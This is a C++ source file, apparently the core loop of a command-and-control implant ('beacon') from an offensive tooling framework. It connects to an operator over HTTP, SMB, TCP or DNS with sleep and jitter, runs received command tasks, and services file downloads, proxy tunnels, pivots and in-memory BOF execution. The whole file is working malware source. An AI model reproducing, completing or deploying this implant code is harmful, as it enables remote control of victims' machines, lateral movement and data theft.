#include "main.h"
#include "ApiLoader.h"
#include "Commander.h"
#include "utils.h"
#include "Crypt.h"
#include "WaitMask.h"
#include "Boffer.h"
#include "Connector.h"

#if defined(BEACON_HTTP)
#include "ConnectorHTTP.h"
#elif defined(BEACON_SMB)
#include "ConnectorSMB.h"
#elif defined(BEACON_TCP)
#include "ConnectorTCP.h"
#elif defined(BEACON_DNS)
#include "ConnectorDNS.h"
#endif

Agent* g_Agent;
Connector* g_Connector;

static Connector* CreateConnector()
{
#if defined(BEACON_HTTP)
	return new ConnectorHTTP();
#elif defined(BEACON_SMB)
	return new ConnectorSMB();
#elif defined(BEACON_TCP)
	return new ConnectorTCP();
#elif defined(BEACON_DNS)
	return new ConnectorDNS();
#endif
}

DWORD WINAPI AgentMain(LPVOID lpParam)
{
	if (!ApiLoad())
		return 0;

	g_Agent = new Agent();
	g_Connector = CreateConnector();

#if defined(BEACON_SMB)
	((ConnectorSMB*)g_Connector)->SetPivotter(g_Agent->pivotter);
#endif

	g_AsyncBofManager = new Boffer();
	g_AsyncBofManager->Initialize();

	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);

	if (!g_Connector->SetProfile(&g_Agent->config->profile, beat, beatSize))
		return 0;

	MemFreeLocal((LPVOID*)&beat, beatSize);

	Packer* packerOut = new Packer();
	packerOut->Pack32(0);

	do {
		if (!g_Connector->WaitForConnection())
			continue;

		do {
			BOOL justSentOutput = FALSE;

			if (packerOut->datasize() > 4) {
				packerOut->Set32(0, packerOut->datasize());
				g_Connector->Exchange(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey);
				packerOut->Clear(TRUE);
				packerOut->Pack32(0);
				justSentOutput = TRUE;
			}
			else {
				g_Connector->Exchange(nullptr, 0, g_Agent->SessionKey);
			}

			if (g_Connector->RecvSize() > 0 && g_Connector->RecvData())
				g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), packerOut);
				
			g_Connector->RecvClear();
			g_Agent->downloader->ProcessDownloader(packerOut);
			g_Agent->jober->ProcessJobs(packerOut);
			g_Agent->proxyfire->ProcessTunnels(packerOut);
			g_Agent->pivotter->ProcessPivots(packerOut);
			g_AsyncBofManager->ProcessAsyncBofs(packerOut);

			if (g_Agent->IsActive()) {
				BOOL hasOutput = (packerOut->datasize() >= 8);
#if defined(BEACON_SMB) || defined(BEACON_TCP)
				if (justSentOutput)
					hasOutput = TRUE;

				if (!hasOutput) {
					hasOutput = (g_Agent->downloader->downloads.size() > 0)
					         || (g_Agent->proxyfire->tunnels.size() > 0)
					         || (g_Agent->jober->jobs.size() > 0);
				}
#endif
				DWORD pollIntervalMs = 0;
#if defined(BEACON_SMB)
				for (int _pi = 0; _pi < (int)g_Agent->pivotter->pivots.size(); _pi++) {
					if (g_Agent->pivotter->pivots[_pi].Type == PIVOT_TYPE_TCP) {
						pollIntervalMs = 10;
						break;
					}
				}

				if (pollIntervalMs == 0 && g_Agent->pivotter->pendingSMBChildReply) {
					DWORD age = ApiWin->GetTickCount() - g_Agent->pivotter->lastSMBChildWriteTick;
					if (age < 500)
						pollIntervalMs = 200;
					else
						g_Agent->pivotter->pendingSMBChildReply = FALSE; 
				}
#else
				if (g_Agent->pivotter->pendingWrite || (g_Agent->pivotter->pivots.size() > 0))
					pollIntervalMs = 10;
#endif
				g_Connector->Sleep(g_AsyncBofManager->GetWakeupEvent(), g_Agent->GetWorkingSleep(), g_Agent->config->sleep_delay, g_Agent->config->jitter_delay, hasOutput, pollIntervalMs);
			}

		} while (g_Connector->IsConnected() && g_Agent->IsActive());

		if (!g_Agent->IsActive() && g_Connector->IsConnected()) {
			g_Agent->commander->Exit(packerOut);
			packerOut->Set32(0, packerOut->datasize());
			g_Connector->Exchange(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey);
			g_Connector->RecvClear();
		}

		g_Connector->Disconnect();

	} while (g_Agent->IsActive());

	packerOut->Clear(FALSE);
	delete packerOut;

	g_Connector->CloseConnector();
	AgentExit(g_Agent->config->exit_method);
	return 0;
}

void AgentExit(const int method)
{
	if (method == 1)
		ApiNt->RtlExitUserThread(STATUS_SUCCESS);
	else if (method == 2)
		ApiNt->RtlExitUserProcess(STATUS_SUCCESS);
}